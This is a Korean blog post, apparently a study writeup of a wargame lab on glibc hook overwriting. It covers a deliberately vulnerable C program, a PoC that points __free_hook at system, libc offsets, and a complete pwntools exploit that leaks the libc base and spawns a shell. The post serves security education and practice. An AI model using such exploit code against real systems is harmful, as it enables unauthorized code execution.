---
layout: post
title: "Hook Overwrite(fho)"
categories: [SWING, Writeup]
tags: [Exploit, Hooking, Memory Management]
last_modified_at: 2024-02-03
---

Exploit Tech: Hook Overwrite  

```cpp
// Name: fho.c
// Compile: gcc -o fho fho.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
  char buf[0x30];
  unsigned long long *addr;
  unsigned long long value;

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  puts("[1] Stack buffer overflow");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  puts("[2] Arbitary-Address-Write");
  printf("To write: ");
  scanf("%llu", &addr);
  printf("With: ");
  scanf("%llu", &value);
  printf("[%p] = %llu\n", addr, value);
  *addr = value;

  puts("[3] Arbitrary-Address-Free");
  printf("To free: ");
  scanf("%llu", &addr);
  free(addr);

  return 0;
}
```

Hook  
OS가 어떤 코드 실행하려고 할 때, 이를 낚아채 다른 코드로 실행 흐름을 바꾸는 걸 Hooking이라고 함  
이때 실행되는 코드가 Hook  

**Hook의 용도..**  
함수에 훅을 심어서 함수의 호출 모니터링..  
함수에 기능 추가..  
아예 다른 코드 심어서 흐름 조작..  

이 실습을 하려면 18.04 환경에서 해줘야 함  

[더보기](https://diary-developer.tistory.com/8)  
하.. 진짜 이거때메 개고생 해서 긴말은 하지 않겟다.................... docker 깔고 저 포스트 참고 ㅗㅗ  

![Image](https://blog.kakaocdn.net/dna/AapHm/btsEkSJ2fdq/AAAAAAAAAAAAAAAAAAAAAHTDxATb3YiwmD6Lo0y5Go9NNu7rZkmj9sQbOcX3u61K/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=nHHOzvqe8E0SgBdhLNHVgtO4wRk%3D)  

메모리 함수 훅  
**malloc, free, realloc hook**  
c언어에서 메모리 동적 할당, 해제하는 함수.. malloc, free, realloc  
해당 함수 libc.so에 구현되어 있음  

libc에는 디버깅을 위한 훅 변수 정의..  
ex) malloc함수는 __malloc_hook 변수의 값이 NULL인지 검사 -> NULL이 아니면 malloc 실행 전에 __malloc_hook이 가리키는 함수 먼저 실행 -> 이때 malloc의 인자는 hook 함수에 전달..  
free와 realloc도 동일한 원리..  

```cpp
// __malloc_hook
void *__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook); // malloc hook read
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0)); // call hook
#if USE_TCACHE
  /* int_free also calls request2size, be careful to not pad twice.  */
  size_t tbytes;
  checked_request2size (bytes, tbytes);
  size_t tc_idx = csize2tidx (tbytes);
  // ...
#endif
}
```

**훅의 위치와 권한**  
hook함수들도 libc.so에 정의되어 있음  

오프셋 확인해보면 0x3ed8e8, 0x3ebc30, 0x3ebc28  

섹션 헤더 정보 참조.. .bss 영역은 0x3ec860부터.. 위 hook 함수들이 이 섹션에 포함됨  
bss 섹션은 쓰기 권한이 있으므로 조작될 수 있음  

Hook Overwrite  
__malloc_hook을 system 함수의 주소로 덮고.. malloc("/bin/sh")을 호출하면 __malloc_hook에서 system("/bin/sh") 호출함  
하단의 코드는 공격이 가능함을 보이는 PoC  

```cpp
// Name: fho-poc.c
// Compile: gcc -o fho-poc fho-poc.c

#include <malloc.h>
#include <stdlib.h>
#include <string.h>

const char *buf="/bin/sh";

int main() {
  printf("\"__free_hook\" now points at \"system\"\n");
  __free_hook = (void *)system;
  printf("call free(\"/bin/sh\")\n");
  free(buf);
}
```

해당 훅은 Glibc 2.34 버전부터 제거..  

**Free Hook Overwrite**  
**보호 기법**  

아.... 다 있네? 허허~  

**코드 분석**  

```cpp
puts("[1] Stack buffer overflow");
printf("Buf: ");
read(0, buf, 0x100);
printf("Buf: %s\n", buf);
```

buf 0x30인데 0x100만큼 받으니까 버퍼 오버플로우..  
하지만 카나리 덮을 수도 없고.. 반환 주소도 유의미하게 조작할 수 없음..  
-> 스택에 있는 데이터 읽는 데 사용 가능  

```cpp
puts("[2] Arbitary-Address-Write");
printf("To write: ");
scanf("%llu", &addr);
printf("With: ");
scanf("%llu", &value);
printf("[%p] = %llu\n", addr, value);
*addr = value;
```

addr을 받아서 값을 작성할 수 있음  

```cpp
puts("[3] Arbitrary-Address-Free");
printf("To free: ");
scanf("%llu", &addr);
free(addr);
```

addr을 받아서 메모리 해제할 수 있음  

**가능한 조건**  
primitive  
1. 스택 값 읽을 수 있음  
2. 임의 주소에 임의 값 작성 가능  
3. 임의 주소 free 가능 -> free_hook 사용 유추..  

**익스플로잇 설계**  
1. 라이브러리 변수 및 함수들의 주소 구하기  
libc에 __free_hook, system, '/bin/sh' 정의되어 있으므로 구하기..  

__free_hook 오프셋.. 0x3ed8e8  
system 함수 오프셋.. 0x4f550  
'/bin/sh'문자열 0x1b3e1a  
오프셋을 구했으니 libc_base 필요.. 여기에 각 오프셋을 더하면 메모리에 저장된 함수(혹은 문자열) 주소 구할 수 있음  
스택에 libc 주소가 있을 가능성 매우 큼 -> 1번 primitive 이용해서 읽기  
main 함수는 __libc_start_main이라는 라이브러리 함수가 호출..  
-> in main함수 스택 프레임.. 어딘가에 있는 반환 주소를 읽으면 libc 베이스 주소 계산 가능  

2. 셸 획득  
위에서 필요한 정보 다 계산하고 __free_hook의 값을 system 함수로 overwrite.. free('/bin/sh') 호출..  
셸 획득!  

**익스플로잇**  
1. 라이브러리 변수 및 함수들의 주소 구하기  
main 함수의 반환 주소인 libc_start_main+n을 릭..  
여기서 libc_start_main+n의 오프셋값 빼면 libc_base..  

*bt: 모든 스택 프레임의 백트레이스 출력하는 명령어  
__libc_start_main+243임을 확인 readelf로 오프셋..  

0x21b10이 __libc_start_main의 오프셋..  
그렇다면 __libc_start_main+231의 오프셋은 0x21b10+231  
__libc_start_main+231 릭하고 거기서 오프셋 빼서 libc_base 구하기  

```python
from pwn import *
context.arch='amd64'
def slog(n,m): return success(': '.join([n,hex(m)]))

p=remote('host3.dreamhack.games',port)
e=ELF('./fho')
libc=ELF('./libc-2.27.so')

# libc 어쩌구 주소 릭하기 
buf=b'a'*0x48 
p.sendafter('Buf: ',buf)
p.recvuntil(buf) 
libc_start_main_xx=u64(p.recvline()[:-1]+b'\x00'*2)
libc_base=libc_start_main_xx-(libc.sym['__libc_start_main'] + 231)

system=libc_base+libc.sym['system']
free_hook=libc_base+libc.sym['__free_hook']
binsh=libc_base+next(libc.search(b'/bin/sh'))

slog('libc_base',libc_base)
slog('system',system)
slog('free_hook',free_hook)
slog('/bin/sh',binsh)
```

2. 셸 획득  

```python
p.recvuntil('To write: ')
p.sendline(str(free_hook).encode())
p.recvuntil('With: ')
p.sendline(str(system).encode())

p.recvuntil('To free: ')
p.sendline(str(binsh).encode())

p.interactive()
```

![Image](https://blog.kakaocdn.net/dna/ZGo98/btsEkCfX6Zc/AAAAAAAAAAAAAAAAAAAAAKBu9QJNwyAkWgztA16B2AS0DsDg3odRi_hI6Y62QuDs/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=vcbC8rz2UduldMZsfhOpyd83bTA%3D)  

**One gadget**  
one gadget(magic_gadget): 실행하면 셸이 획득되는 코드 뭉치..  
ROP chain이나 RTL 같은 경우는 여러 개의 가젯 조합..  
원 가젯은 단일 가젯으로만 셸 실행 가능  

원 가젯은 libc 버전마다 다름.. 제약 조건도 다름..  
if 함수에 인자 전달이 어려움 -> 원 가젯 활용!  
ex)  
__malloc_hook 오버라이트 가능.. but malloc의 인자에 작은 정수만 들어올 수 있음..  